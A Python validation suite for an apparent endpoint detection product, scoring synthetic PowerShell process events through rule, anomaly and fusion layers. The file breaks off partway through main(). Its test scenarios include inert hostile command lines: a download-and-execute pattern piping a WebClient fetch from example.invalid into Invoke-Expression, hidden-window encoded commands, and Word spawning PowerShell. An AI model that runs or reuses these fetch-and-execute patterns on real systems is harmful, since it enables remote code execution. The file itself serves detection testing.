from __future__ import annotations
from endpoint.storage.database import (
    initialize_database,
)
import csv
import json
import sqlite3
import time
import uuid

from pathlib import Path
from typing import Any, Dict, List, Optional


from config import (
    ACTIVE_SOC_DATABASE_PATH,
    IS_VALIDATION_MODE,
)

from endpoint.agent.telemetry_manager import (
    shared_telemetry_manager,
)

from endpoint.collectors.fusion_v3_primary_process_monitor import (
    FusionV3PrimaryProcessMonitor,
)

from ai_detection.behavior.process_context_tracker import (
    shared_process_behavior_context,
)


# ================================================================
# PATHS
# ================================================================

REPORT_DIR = (
    Path(__file__)
    .resolve()
    .parents[1]
    / "reports"
)

REPORT_DIR.mkdir(
    parents=True,
    exist_ok=True,
)


# ================================================================
# RUN ID
# ================================================================

VALIDATION_RUN_ID = (
    "POWERSHELL-BATCH-"
    + uuid.uuid4().hex[:8].upper()
)


# ================================================================
# SAFE SYNTHETIC PROCESS BUILDER
# ================================================================

def build_process(
    *,
    pid: int,
    command_line: Optional[str],
    parent_name: Optional[str] = "explorer.exe",
    create_time: Optional[float] = None,
):

    return {

        "pid":
            pid,

        "ppid":
            991000,

        "name":
            "powershell.exe",

        "exe":
            (
                r"C:\Windows\System32"
                r"\WindowsPowerShell\v1.0"
                r"\powershell.exe"
            ),

        "cmdline":
            command_line,

        "username":
            "sentinel-validation",

        "create_time":
            (
                create_time
                if create_time is not None
                else time.time() - 5.0
            ),

        "parent_name":
            parent_name,

        # --------------------------------------------------------
        # Keep resource values stable.
        #
        # We do NOT want CPU/memory noise contaminating
        # PowerShell rule validation.
        # --------------------------------------------------------

        "cpu_percent":
            0.5,

        "memory_percent":
            0.2,

        "rss_mb":
            45.0,

        "num_threads":
            8,

        "num_handles":
            120,
    }


# ================================================================
# STANDARD SCENARIOS
# ================================================================

SCENARIOS = [

    # ------------------------------------------------------------
    # P1-01
    # ------------------------------------------------------------

    {
        "id":
            "P1-01",

        "name":
            "Benign PowerShell Get-Process",

        "process":
            build_process(
                pid=992101,
                command_line=(
                    'powershell.exe '
                    '-NoLogo -NoProfile '
                    '-Command "Get-Process"'
                ),
            ),

        "expected_rule_score":
            5,

        "expected_rule_suspicious":
            False,

        "expected_alert":
            False,

        "expected_threat_type":
            None,
    },


    # ------------------------------------------------------------
    # P1-02
    # ------------------------------------------------------------

    {
        "id":
            "P1-02",

        "name":
            "Benign PowerShell Get-Service",

        "process":
            build_process(
                pid=992102,
                command_line=(
                    'powershell.exe '
                    '-NoLogo -NoProfile '
                    '-Command "Get-Service"'
                ),
            ),

        "expected_rule_score":
            5,

        "expected_rule_suspicious":
            False,

        "expected_alert":
            False,

        "expected_threat_type":
            None,
    },


    # ------------------------------------------------------------
    # P1-03
    # ------------------------------------------------------------

    {
        "id":
            "P1-03",

        "name":
            "PowerShell Invoke-WebRequest",

        "process":
            build_process(
                pid=992103,
                command_line=(
                    'powershell.exe '
                    '-NoProfile '
                    '-Command "'
                    'Invoke-WebRequest '
                    'https://example.invalid/file.txt '
                    '-OutFile C:\\Temp\\file.txt'
                    '"'
                ),
            ),

        "expected_rule_score":
            30,

        "expected_rule_suspicious":
            False,

        "expected_alert":
            False,

        "expected_threat_type":
            None,
    },


    # ------------------------------------------------------------
    # P1-04
    #
    # EXPECTED TO EXPOSE CURRENT -enc DOUBLE-MATCH BUG.
    #
    # Correct semantic score:
    #
    #       monitored PowerShell   5
    #       encoded command       30
    #       -------------------------
    #       total                 35
    # ------------------------------------------------------------

    {
        "id":
            "P1-04",

        "name":
            "Encoded PowerShell",

        "process":
            build_process(
                pid=992104,
                command_line=(
                    "powershell.exe "
                    "-NoProfile "
                    "-EncodedCommand "
                    "SYNTHETIC_PAYLOAD"
                ),
            ),

        "expected_rule_score":
            35,

        "expected_rule_suspicious":
            True,

        # We first validate semantic rule correctness.
        # Fusion outcome will still be captured.
        "expected_alert":
            None,

        "expected_threat_type":
            None,
    },


    # ------------------------------------------------------------
    # P1-05
    #
    # Correct semantic score:
    #
    #       PowerShell        5
    #       encoded          30
    #       hidden           15
    #       -------------------
    #       total            50
    # ------------------------------------------------------------

    {
        "id":
            "P1-05",

        "name":
            "Hidden Encoded PowerShell",

        "process":
            build_process(
                pid=992105,
                command_line=(
                    "powershell.exe "
                    "-WindowStyle Hidden "
                    "-EncodedCommand "
                    "SYNTHETIC_PAYLOAD"
                ),
            ),

        "expected_rule_score":
            50,

        "expected_rule_suspicious":
            True,

        "expected_alert":
            None,

        "expected_threat_type":
            None,
    },


    # ------------------------------------------------------------
    # P1-06
    #
    # Correct semantic rule score:
    #
    #       PowerShell        5
    #       encoded          30
    #       Office parent    40
    #       -------------------
    #       total            75
    # ------------------------------------------------------------

    {
        "id":
            "P1-06",

        "name":
            "Word spawning encoded PowerShell",

        "process":
            build_process(
                pid=992106,
                parent_name="winword.exe",
                command_line=(
                    "powershell.exe "
                    "-NoProfile "
                    "-EncodedCommand "
                    "SYNTHETIC_DOCUMENT_PAYLOAD"
                ),
            ),

        "expected_rule_score":
            75,

        "expected_rule_suspicious":
            True,

        "expected_alert":
            True,

        "expected_threat_type":
            "DOCUMENT_TO_POWERSHELL",
    },


    # ------------------------------------------------------------
    # P1-07
    #
    # Inert string only.
    #
    # Current rules:
    #
    #       monitored binary      5
    #       DownloadString       20
    #       URL                  15
    #       -----------------------
    #       total                40
    # ------------------------------------------------------------

    {
        "id":
            "P1-07",

        "name":
            "PowerShell download and execution pattern",

        "process":
            build_process(
                pid=992107,
                command_line=(
                    'powershell.exe '
                    '-NoProfile '
                    '-Command "'
                    '(New-Object Net.WebClient).'
                    "DownloadString("
                    "'https://example.invalid/payload.txt'"
                    ") | Invoke-Expression"
                    '"'
                ),
            ),

        "expected_rule_score":
            70,

        "expected_rule_suspicious":
            True,

        "expected_alert":
            True,

        "expected_threat_type":
            "POWERSHELL_DOWNLOAD_EXECUTION",
    },


    # ------------------------------------------------------------
    # P1-10
    #
    # Missing command + missing parent.
    #
    # Must never become HIGH solely because telemetry is incomplete.
    # ------------------------------------------------------------

    {
        "id":
            "P1-10",

        "name":
            "Incomplete PowerShell telemetry",

        "process":
            build_process(
                pid=992110,
                command_line="",
                parent_name=None,
            ),

        "expected_rule_score":
            5,

        "expected_rule_suspicious":
            False,

        "expected_alert":
            False,

        "expected_threat_type":
            None,
    },
]


# ================================================================
# TEMPORAL SEQUENCE — P1-08
# ================================================================

TEMPORAL_PID = 992108

TEMPORAL_CREATE_TIME = (
    time.time()
    - 60.0
)


TEMPORAL_COMMANDS = [

    (
        'powershell.exe '
        '-NoProfile '
        '-Command "Get-Process"'
    ),

    (
        'powershell.exe '
        '-NoProfile '
        '-Command "Get-Service"'
    ),

    (
        'powershell.exe '
        '-NoProfile '
        '-Command "Get-Date"'
    ),

    (
        'powershell.exe '
        '-NoProfile '
        '-Command "Get-ChildItem C:\\Temp"'
    ),

    (
        'powershell.exe '
        '-NoProfile '
        '-Command "'
        'Invoke-WebRequest '
        'https://example.invalid/a.txt '
        '-OutFile C:\\Temp\\a.txt'
        '"'
    ),

    (
        'powershell.exe '
        '-NoProfile '
        '-EncodedCommand '
        'SYNTHETIC_TEMPORAL_A'
    ),

    (
        'powershell.exe '
        '-WindowStyle Hidden '
        '-EncodedCommand '
        'SYNTHETIC_TEMPORAL_B'
    ),

    (
        'powershell.exe '
        '-WindowStyle Hidden '
        '-Command "'
        "[Convert]::FromBase64String("
        "'U1lOVEhFVElD'"
        ") | Out-Null; "
        "(New-Object Net.WebClient)."
        "DownloadString("
        "'https://example.invalid/p.txt'"
        ") | Invoke-Expression"
        '"'
    ),
]


# ================================================================
# DATABASE HELPERS
# ================================================================

def get_connection():

    connection = sqlite3.connect(
        ACTIVE_SOC_DATABASE_PATH
    )

    connection.row_factory = (
        sqlite3.Row
    )

    return connection


def get_detections_for_event(
    event_id: str,
) -> List[Dict[str, Any]]:

    connection = (
        get_connection()
    )

    try:

        rows = (
            connection.execute(
                """
                SELECT
                    id,
                    event_id,
                    engine,
                    detected,
                    threat_type,
                    confidence,
                    risk_score,
                    severity,
                    reason,
                    created_at

                FROM detections

                WHERE event_id = ?

                ORDER BY id ASC
                """,
                (
                    event_id,
                ),
            )
            .fetchall()
        )

        return [
            dict(row)
            for row in rows
        ]

    finally:

        connection.close()


# ================================================================
# SAFE VALUE
# ================================================================

def number(
    value,
    default=0.0,
):

    try:

        return float(
            value
        )

    except (
        TypeError,
        ValueError,
    ):

        return float(
            default
        )


# ================================================================
# TEMPORAL DATA EXTRACTION
# ================================================================

def get_temporal_details(
    ai_result: dict,
):

    wrapper = (
        ai_result.get(
            "temporal"
        )

        or {}
    )


    temporal_result = (
        wrapper.get(
            "temporal_result"
        )

        or {}
    )


    return {

        "state":
            wrapper.get(
                "state"
            ),

        "available":
            wrapper.get(
                "available"
            ),

        "depth":
            (
                wrapper.get(
                    "depth"
                )

                or

                (
                    wrapper.get(
                        "buffer",
                        {}
                    )
                    or {}
                ).get(
                    "depth"
                )
            ),

        "score":
            temporal_result.get(
                "anomaly_score"
            ),

        "severity":
            temporal_result.get(
                "severity"
            ),

        "label":
            temporal_result.get(
                "anomaly_label"
            ),

        "should_alert":
            temporal_result.get(
                "should_alert"
            ),

        "result_id":
            wrapper.get(
                "temporal_result_id"
            ),
    }


# ================================================================
# RUN ONE DETECTOR OBSERVATION
# ================================================================

def evaluate_process(
    monitor,
    *,
    scenario_id: str,
    scenario_name: str,
    process_info: dict,
    persist_detection: bool = True,
):

    # ============================================================
    # RULES
    # ============================================================

    rule_result = (
        monitor.behavior_detector
        .analyze(
            process_info
        )
    )


    # ============================================================
    # STATISTICAL
    # ============================================================

    statistical_result = (
        monitor.anomaly_detector
        .analyze(
            process_info
        )
    )


    # ============================================================
    # CONTEXT
    # ============================================================

    pid = (
        process_info.get(
            "pid"
        )
    )

    ppid = (
        process_info.get(
            "ppid"
        )
    )


    shared_process_behavior_context \
        .record_process_activity(
            pid
        )


    shared_process_behavior_context \
        .record_child_process(
            ppid
        )


    context = (
        shared_process_behavior_context
        .get_context(
            pid
        )
    )


    # ============================================================
    # IF + AE + TEMPORAL
    # ============================================================

    ai_result = (
        monitor.collect_ai_behavior_features(

            process_info=
                process_info,

            context=
                context,
        )
    )


    feature_record_id = (
        ai_result.get(
            "record_id"
        )
    )


    isolation_result = (
        ai_result.get(
            "isolation_forest"
        )

        or {}
    )


    autoencoder_result = (
        ai_result.get(
            "autoencoder"
        )

        or {}
    )


    # ============================================================
    # AUTHORITATIVE FUSION V3
    # ============================================================

    fusion_result = (
        monitor.calculate_fusion(

            behavior_result=
                rule_result,

            anomaly_result=
                statistical_result,

            isolation_result=
                isolation_result,

            autoencoder_result=
                autoencoder_result,
        )
    )


    temporal = (
        get_temporal_details(
            ai_result
        )
    )


    # ============================================================
    # EVENT PAYLOAD
    # ============================================================

    process_data = dict(
        process_info
    )


    process_data.update(
        {

            "behavior_score":
                rule_result.get(
                    "behavior_score"
                ),

            "behavior_indicators":
                rule_result.get(
                    "indicators",
                    [],
                ),

            "behavior_reasons":
                rule_result.get(
                    "reasons",
                    [],
                ),

            "statistical_score":
                statistical_result.get(
                    "anomaly_score"
                ),

            "statistical_indicators":
                statistical_result.get(
                    "indicators",
                    [],
                ),

            "isolation_forest":
                isolation_result,

            "autoencoder":
                autoencoder_result,

            "temporal":
                temporal,

            "fusion_version":
                fusion_result.get(
                    "fusion_version"
                ),

            "fusion_score":
                fusion_result.get(
                    "fusion_score"
                ),

            "fusion_severity":
                fusion_result.get(
                    "severity"
                ),

            "fusion_suspicious":
                fusion_result.get(
                    "suspicious"
                ),

            "fusion_should_alert":
                fusion_result.get(
                    "should_alert"
                ),

            "primary_engine":
                fusion_result.get(
                    "primary_engine"
                ),
        }
    )


    # ============================================================
    # LIVE COUNTER
    # ============================================================

    live_before = (
        shared_telemetry_manager
        .get_live_snapshot(
            reset_interval=False
        )
        .get(
            "runtime_event_count",
            0,
        )
    )


    # ============================================================
    # VALIDATION EVENT
    # ============================================================

    event = (
        shared_telemetry_manager
        .emit_validation(

            scenario_id=
                scenario_id,

            validation_run_id=
                VALIDATION_RUN_ID,

            event_type=
                "process_start",

            source=
                "powershell_validation_suite",

            severity=
                fusion_result.get(
                    "severity",
                    "INFO",
                ),

            process=
                process_data,

            metadata={

                "detector_family":
                    "PROCESS",

                "detector":
                    "POWERSHELL",

                "scenario_name":
                    scenario_name,
            },
        )
    )


    # ============================================================
    # REAL PERSISTENCE LOGIC
    # ============================================================

    if persist_detection:

        monitor.save_fusion_detection(

            event=
                event,

            process_info=
                process_info,

            fusion_result=
                fusion_result,

            feature_record_id=
                feature_record_id,
        )


    live_after = (
        shared_telemetry_manager
        .get_live_snapshot(
            reset_interval=False
        )
        .get(
            "runtime_event_count",
            0,
        )
    )


    detections = (
        get_detections_for_event(
            event.event_id
        )
    )


    return {

        "scenario_id":
            scenario_id,

        "scenario_name":
            scenario_name,

        "event_id":
            event.event_id,

        "process":
            process_info,

        "rule":
            rule_result,

        "statistical":
            statistical_result,

        "isolation_forest":
            isolation_result,

        "autoencoder":
            autoencoder_result,

        "temporal":
            temporal,

        "fusion":
            fusion_result,

        "feature_record_id":
            feature_record_id,

        "detections":
            detections,

        "stored_detection_count":
            len(
                detections
            ),

        "live_counter_before":
            live_before,

        "live_counter_after":
            live_after,

        "live_isolation_ok":
            (
                live_before
                == live_after
            ),
    }


# ================================================================
# EVALUATE EXPECTATIONS
# ================================================================

def validate_result(
    scenario,
    result,
):

    failures = []


    rule = (
        result[
            "rule"
        ]
    )


    statistical = (
        result[
            "statistical"
        ]
    )


    fusion = (
        result[
            "fusion"
        ]
    )


    isolation = (
        result[
            "isolation_forest"
        ]
    )


    autoencoder = (
        result[
            "autoencoder"
        ]
    )


    detections = (
        result[
            "detections"
        ]
    )


    # ============================================================
    # RULE SCORE
    # ============================================================

    expected_rule_score = (
        scenario.get(
            "expected_rule_score"
        )
    )


    if expected_rule_score is not None:

        actual_rule_score = (
            rule.get(
                "behavior_score"
            )
        )


        if (
            actual_rule_score
            != expected_rule_score
        ):

            failures.append(
                {
                    "layer":
                        "RULE",

                    "reason":
                        "RULE_SCORE_MISMATCH",

                    "expected":
                        expected_rule_score,

                    "actual":
                        actual_rule_score,
                }
            )


    # ============================================================
    # RULE SUSPICIOUS FLAG
    # ============================================================

    expected_rule_suspicious = (
        scenario.get(
            "expected_rule_suspicious"
        )
    )


    if expected_rule_suspicious is not None:

        actual = bool(
            rule.get(
                "suspicious",
                False,
            )
        )


        if (
            actual
            != expected_rule_suspicious
        ):

            failures.append(
                {
                    "layer":
                        "RULE",

                    "reason":
                        "RULE_SUSPICIOUS_MISMATCH",

                    "expected":
                        expected_rule_suspicious,

                    "actual":
                        actual,
                }
            )


    # ============================================================
    # STATISTICAL
    #
    # Static PowerShell scenarios deliberately use stable resource
    # metrics. Unexpected statistical detection is a failure.
    # ============================================================

    if not scenario.get(
        "allow_statistical_anomaly",
        False,
    ):

        if bool(
            statistical.get(
                "anomalous",
                False,
            )
        ):

            failures.append(
                {
                    "layer":
                        "STATISTICAL",

                    "reason":
                        "UNEXPECTED_STATISTICAL_ANOMALY",

                    "actual_score":
                        statistical.get(
                            "anomaly_score"
                        ),
                }
            )


    # ============================================================
    # MODEL AVAILABILITY
    # ============================================================

    if not isolation.get(
        "available",
        False,
    ):

        failures.append(
            {
                "layer":
                    "ISOLATION_FOREST",

                "reason":
                    "MODEL_UNAVAILABLE",
            }
        )


    if not autoencoder.get(
        "available",
        False,
    ):

        failures.append(
            {
                "layer":
                    "AUTOENCODER",

                "reason":
                    "MODEL_UNAVAILABLE",
            }
        )


    # ============================================================
    # FUSION EXPECTATION
    # ============================================================

    expected_alert = (
        scenario.get(
            "expected_alert"
        )
    )


    if expected_alert is not None:

        actual_alert = bool(
            fusion.get(
                "should_alert",
                False,
            )
        )


        if (
            actual_alert
            != expected_alert
        ):

            failures.append(
                {
                    "layer":
                        "FUSION",

                    "reason":
                        "ALERT_POLICY_MISMATCH",

                    "expected":
                        expected_alert,

                    "actual":
                        actual_alert,

                    "fusion_score":
                        fusion.get(
                            "fusion_score"
                        ),

                    "severity":
                        fusion.get(
                            "severity"
                        ),
                }
            )


    # ============================================================
    # BENIGN / BORDERLINE DETECTION PERSISTENCE
    # ============================================================

    if expected_alert is False:

        if len(
            detections
        ) != 0:

            failures.append(
                {
                    "layer":
                        "PERSISTENCE",

                    "reason":
                        "FALSE_POSITIVE_DETECTION_STORED",

                    "count":
                        len(
                            detections
                        ),
                }
            )


    # ============================================================
    # EXPECTED MALICIOUS DETECTION PERSISTENCE
    # ============================================================

    if expected_alert is True:

        if len(
            detections
        ) == 0:

            failures.append(
                {
                    "layer":
                        "PERSISTENCE",

                    "reason":
                        "EXPECTED_DETECTION_NOT_STORED",
                }
            )


    # ============================================================
    # THREAT CLASSIFICATION
    # ============================================================

    expected_threat_type = (
        scenario.get(
            "expected_threat_type"
        )
    )


    if (
        expected_threat_type
        and
        len(
            detections
        ) > 0
    ):

        actual_threat_type = (
            detections[
                -1
            ].get(
                "threat_type"
            )
        )


        if (
            actual_threat_type
            != expected_threat_type
        ):

            failures.append(
                {
                    "layer":
                        "CLASSIFICATION",

                    "reason":
                        "THREAT_TYPE_MISMATCH",

                    "expected":
                        expected_threat_type,

                    "actual":
                        actual_threat_type,
                }
            )


    # ============================================================
    # SYNTHETIC / LIVE SEPARATION
    # ============================================================

    if not result.get(
        "live_isolation_ok",
        False,
    ):

        failures.append(
            {
                "layer":
                    "ISOLATION",

                "reason":
                    "SYNTHETIC_INCREMENTED_LIVE_COUNTER",
            }
        )


    result[
        "failures"
    ] = failures


    result[
        "passed"
    ] = (
        len(
            failures
        )
        == 0
    )


    return result


# ================================================================
# RUN STANDARD CASE
# ================================================================

def run_standard_scenario(
    monitor,
    scenario,
):

    result = (
        evaluate_process(

            monitor,

            scenario_id=
                scenario[
                    "id"
                ],

            scenario_name=
                scenario[
                    "name"
                ],

            process_info=
                scenario[
                    "process"
                ],
        )
    )


    return (
        validate_result(
            scenario,
            result,
        )
    )


# ================================================================
# P1-08 — TEMPORAL SEQUENCE
# ================================================================

def run_temporal_scenario(
    monitor,
):

    step_results = []


    for (
        index,
        command,
    ) in enumerate(
        TEMPORAL_COMMANDS,
        start=1,
    ):

        process_info = (
            build_process(

                pid=
                    TEMPORAL_PID,

                create_time=
                    TEMPORAL_CREATE_TIME,

                command_line=
                    command,

                parent_name=
                    "explorer.exe",
            )
        )


        result = (
            evaluate_process(

                monitor,

                scenario_id=(
                    f"P1-08-S{index:02d}"
                ),

                scenario_name=(
                    "Temporal PowerShell "
                    f"Sequence Step {index}"
                ),

                process_info=
                    process_info,
            )
        )


        step_results.append(
            result
        )


        final_source = (
            step_results[
                -1
            ]
        )


        # IMPORTANT:
        # make a NEW top-level object.
        #
        # Do not mutate the final object already contained inside
        # step_results, otherwise sequence_steps becomes circular.
        final = dict(
            final_source
        )


    failures = []


    temporal = (
        final[
            "temporal"
        ]
    )


    # ------------------------------------------------------------
    # Required condition:
    # after 8 samples Temporal v2 must actually run.
    # ------------------------------------------------------------

    if (
        temporal.get(
            "state"
        )
        !=
        "TEMPORAL_INFERENCE_COMPLETE"
    ):

        failures.append(
            {
                "layer":
                    "TEMPORAL",

                "reason":
                    "TEMPORAL_SEQUENCE_DID_NOT_COMPLETE",

                "actual_state":
                    temporal.get(
                        "state"
                    ),

                "depth":
                    temporal.get(
                        "depth"
                    ),
            }
        )


    # ------------------------------------------------------------
    # Final multi-stage sequence should be escalated by Fusion.
    # ------------------------------------------------------------

    if not final[
        "fusion"
    ].get(
        "should_alert",
        False,
    ):

        failures.append(
            {
                "layer":
                    "FUSION",

                "reason":
                    "TEMPORAL_ATTACK_NOT_ESCALATED",

                "fusion_score":
                    final[
                        "fusion"
                    ].get(
                        "fusion_score"
                    ),

                "temporal_score":
                    temporal.get(
                        "score"
                    ),
            }
        )


    if not final.get(
        "live_isolation_ok",
        False,
    ):

        failures.append(
            {
                "layer":
                    "ISOLATION",

                "reason":
                    "SYNTHETIC_INCREMENTED_LIVE_COUNTER",
            }
        )


    final[
        "scenario_id"
    ] = "P1-08"


    final[
        "scenario_name"
    ] = (
        "Eight-step temporal PowerShell sequence"
    )


    final[
        "sequence_steps"
    ] = [

        {

            "scenario_id":
                step.get(
                    "scenario_id"
                ),

            "rule_score":
                (
                    step.get(
                        "rule",
                        {}
                    )
                    or {}
                ).get(
                    "behavior_score"
                ),

            "statistical_score":
                (
                    step.get(
                        "statistical",
                        {}
                    )
                    or {}
                ).get(
                    "anomaly_score"
                ),

            "if_score":
                (
                    step.get(
                        "isolation_forest",
                        {}
                    )
                    or {}
                ).get(
                    "anomaly_confidence"
                ),

            "ae_score":
                (
                    step.get(
                        "autoencoder",
                        {}
                    )
                    or {}
                ).get(
                    "anomaly_confidence"
                ),

            "temporal_state":
                (
                    step.get(
                        "temporal",
                        {}
                    )
                    or {}
                ).get(
                    "state"
                ),

            "temporal_score":
                (
                    step.get(
                        "temporal",
                        {}
                    )
                    or {}
                ).get(
                    "score"
                ),

            "fusion_score":
                (
                    step.get(
                        "fusion",
                        {}
                    )
                    or {}
                ).get(
                    "fusion_score"
                ),

            "should_alert":
                (
                    step.get(
                        "fusion",
                        {}
                    )
                    or {}
                ).get(
                    "should_alert"
                ),

            "event_id":
                step.get(
                    "event_id"
                ),
        }

        for step
        in step_results
    ]


    final[
        "failures"
    ] = failures


    final[
        "passed"
    ] = (
        len(
            failures
        )
        == 0
    )


    return final


# ================================================================
# P1-09 — DUPLICATE DETECTION
# ================================================================

def run_duplicate_scenario(
    monitor,
):

    # ------------------------------------------------------------
    # Strong but inert synthetic pattern.
    #
    # Uses FromBase64String instead of -EncodedCommand so this test
    # is independent of the known -enc substring bug.
    # ------------------------------------------------------------

    process_info = (
        build_process(

            pid=
                992109,

            parent_name=
                "winword.exe",

            command_line=(
                'powershell.exe '
                '-WindowStyle Hidden '
                '-Command "'
                "[Convert]::FromBase64String("
                "'U1lOVEhFVElD'"
                ") | Out-Null"
                '"'
            ),
        )
    )


    result = (
        evaluate_process(

            monitor,

            scenario_id=
                "P1-09",

            scenario_name=
                "Duplicate detection persistence",

            process_info=
                process_info,

            persist_detection=
                False,
        )
    )


    failures = []


    if not result[
        "fusion"
    ].get(
        "should_alert",
        False,
    ):

        failures.append(
            {
                "layer":
                    "FUSION",

                "reason":
                    "DUPLICATE_TEST_BASE_EVENT_NOT_ALERTING",

                "fusion_score":
                    result[
                        "fusion"
                    ].get(
                        "fusion_score"
                    ),
            }
        )


    # ============================================================
    # CALL REAL DETECTION PERSISTENCE TWICE
    # ============================================================

    monitor.save_fusion_detection(

        event=type(
            "EventProxy",
            (),
            {
                "event_id":
                    result[
                        "event_id"
                    ]
            },
        )(),

        process_info=
            process_info,

        fusion_result=
            result[
                "fusion"
            ],

        feature_record_id=
            result[
                "feature_record_id"
            ],
    )


    monitor.save_fusion_detection(

        event=type(
            "EventProxy",
            (),
            {
                "event_id":
                    result[
                        "event_id"
                    ]
            },
        )(),

        process_info=
            process_info,

        fusion_result=
            result[
                "fusion"
            ],

        feature_record_id=
            result[
                "feature_record_id"
            ],
    )


    detections = (
        get_detections_for_event(
            result[
                "event_id"
            ]
        )
    )


    result[
        "detections"
    ] = detections


    result[
        "stored_detection_count"
    ] = len(
        detections
    )


    # ============================================================
    # EXPECT DEDUPLICATION
    # ============================================================

    if len(
        detections
    ) != 1:

        failures.append(
            {
                "layer":
                    "PERSISTENCE",

                "reason":
                    "DUPLICATE_DETECTION_NOT_DEDUPLICATED",

                "expected":
                    1,

                "actual":
                    len(
                        detections
                    ),
            }
        )


    result[
        "failures"
    ] = failures


    result[
        "passed"
    ] = (
        len(
            failures
        )
        == 0
    )


    return result


# ================================================================
# SUMMARY RECORD
# ================================================================

def build_summary_row(
    result,
):

    rule = (
        result.get(
            "rule",
            {}
        )
    )


    statistical = (
        result.get(
            "statistical",
            {}
        )
    )


    isolation = (
        result.get(
            "isolation_forest",
            {}
        )
    )


    autoencoder = (
        result.get(
            "autoencoder",
            {}
        )
    )


    temporal = (
        result.get(
            "temporal",
            {}
        )
    )


    fusion = (
        result.get(
            "fusion",
            {}
        )
    )


    detections = (
        result.get(
            "detections",
            []
        )
    )


    last_detection = (
        detections[
            -1
        ]

        if detections

        else {}
    )


    failure_layers = sorted(
        {
            failure.get(
                "layer",
                "UNKNOWN",
            )

            for failure
            in result.get(
                "failures",
                []
            )
        }
    )


    return {

        "scenario_id":
            result.get(
                "scenario_id"
            ),

        "scenario_name":
            result.get(
                "scenario_name"
            ),

        "rule_score":
            rule.get(
                "behavior_score"
            ),

        "rule_suspicious":
            rule.get(
                "suspicious"
            ),

        "statistical_score":
            statistical.get(
                "anomaly_score"
            ),

        "if_score":
            isolation.get(
                "anomaly_confidence"
            ),

        "if_label":
            isolation.get(
                "anomaly_label"
            ),

        "ae_score":
            autoencoder.get(
                "anomaly_confidence"
            ),

        "ae_label":
            autoencoder.get(
                "anomaly_label"
            ),

        "temporal_state":
            temporal.get(
                "state"
            ),

        "temporal_score":
            temporal.get(
                "score"
            ),

        "fusion_score":
            fusion.get(
                "fusion_score"
            ),

        "severity":
            fusion.get(
                "severity"
            ),

        "should_alert":
            fusion.get(
                "should_alert"
            ),

        "active_signals":
            ",".join(
                fusion.get(
                    "active_signals",
                    [],
                )
                or []
            ),

        "strong_signals":
            ",".join(
                fusion.get(
                    "strong_signals",
                    [],
                )
                or []
            ),

        "stored_detections":
            result.get(
                "stored_detection_count",
                0,
            ),

        "stored_engine":
            last_detection.get(
                "engine"
            ),

        "stored_threat_type":
            last_detection.get(
                "threat_type"
            ),

        "failure_layers":
            ",".join(
                failure_layers
            ),

        "passed":
            result.get(
                "passed",
                False,
            ),
    }


# ================================================================
# SAVE REPORTS
# ================================================================

def save_reports(
    results,
):

    json_path = (
        REPORT_DIR
        / "powershell_validation.json"
    )


    csv_path = (
        REPORT_DIR
        / "powershell_validation.csv"
    )


    payload = {

        "validation_run_id":
            VALIDATION_RUN_ID,

        "generated_at":
            time.time(),

        "total":
            len(
                results
            ),

        "passed":
            sum(
                1
                for result
                in results
                if result.get(
                    "passed"
                )
            ),

        "failed":
            sum(
                1
                for result
                in results
                if not result.get(
                    "passed"
                )
            ),

        "results":
            results,
    }


    with open(
        json_path,
        "w",
        encoding="utf-8",
    ) as handle:

        json.dump(
            payload,
            handle,
            indent=2,
            default=str,
        )


    summary_rows = [

        build_summary_row(
            result
        )

        for result
        in results
    ]


    if summary_rows:

        with open(
            csv_path,
            "w",
            newline="",
            encoding="utf-8",
        ) as handle:

            writer = csv.DictWriter(

                handle,

                fieldnames=list(
                    summary_rows[
                        0
                    ].keys()
                ),
            )


            writer.writeheader()

            writer.writerows(
                summary_rows
            )


    return (
        json_path,
        csv_path,
        summary_rows,
    )


# ================================================================
# CONSOLE MATRIX
# ================================================================

def flag(
    condition,
):

    return (
        "PASS"
        if condition
        else "FAIL"
    )


def print_matrix(
    summary_rows,
):

    print()

    print(
        "=" * 132
    )

    print(
        "SENTINEL-X POWERSHELL VALIDATION MATRIX"
    )

    print(
        "=" * 132
    )


    header = (
        f"{'ID':<8}"
        f"{'Rule':>8}"
        f"{'Stat':>8}"
        f"{'IF':>9}"
        f"{'AE':>9}"
        f"{'Temp':>14}"
        f"{'Fusion':>10}"
        f"{'Alert':>8}"
        f"{'Stored':>9}"
        f"{'Final':>9}"
    )


    print(
        header
    )


    print(
        "-" * 132
    )


    for row in summary_rows:

        temp_state = str(
            row.get(
                "temporal_state"
            )
            or "-"
        )


        if len(
            temp_state
        ) > 12:

            temp_state = (
                temp_state[
                    :12
                ]
            )


        print(

            f"{str(row['scenario_id']):<8}"

            f"{str(row['rule_score']):>8}"

            f"{str(row['statistical_score']):>8}"

            f"{str(row['if_score']):>9}"

            f"{str(row['ae_score']):>9}"

            f"{temp_state:>14}"

            f"{str(row['fusion_score']):>10}"

            f"{str(row['should_alert']):>8}"

            f"{str(row['stored_detections']):>9}"

            f"{flag(row['passed']):>9}"
        )


    print(
        "=" * 132
    )


# ================================================================
# FAILURE DETAILS ONLY
# ================================================================

def print_failures(
    results,
):

    failed = [

        result

        for result
        in results

        if not result.get(
            "passed",
            False,
        )
    ]


    if not failed:

        print(
            "\nNO FAILURES — ALL SCENARIOS PASSED."
        )

        return


    print(
        "\n"
        + "=" * 78
    )

    print(
        "FAILURE ANALYSIS"
    )

    print(
        "=" * 78
    )


    for result in failed:

        print()

        print(
            f"{result['scenario_id']} — "
            f"{result['scenario_name']}"
        )


        print(
            "-" * 78
        )


        for failure in result.get(
            "failures",
            []
        ):

            print(
                json.dumps(
                    failure,
                    indent=2,
                    default=str,
                )
            )


        print(
            "Rule indicators:",
            result.get(
                "rule",
                {}
            ).get(
                "indicators"
            )
        )


        print(
            "Rule reasons:",
            result.get(
                "rule",
                {}
            ).get(
                "reasons"
            )
        )


        print(
            "Fusion score:",
            result.get(
                "fusion",
                {}
            ).get(
                "fusion_score"
            )
        )


        print(
            "Fusion reasons:",
            result.get(
                "fusion",
                {}
            ).get(
                "reasons"
            )
        )


        print(
            "Stored detections:",
            result.get(
                "detections"
            )
        )


# ================================================================
# MAIN
# ================================================================

def main():
    initialize_database()
    if not IS_VALIDATION_MODE:

        raise RuntimeError(
            "PowerShell batch validation requires "
            "SENTINEL_RUNTIME_MODE=VALIDATION."
        )


    print(
        "=" * 78
    )

    print(
        "SENTINEL-X POWERSHELL BATCH VALIDATION"
    )

    print(
        f"Validation Run: {VALIDATION_RUN_ID}"
    )

    print(
        "=" * 78
    )


    # ============================================================
    # LOAD MODELS ONCE
    # ============================================================

    monitor = (
        FusionV3PrimaryProcessMonitor(
            poll_interval=2.0
        )
    )


    results = []


    # ============================================================
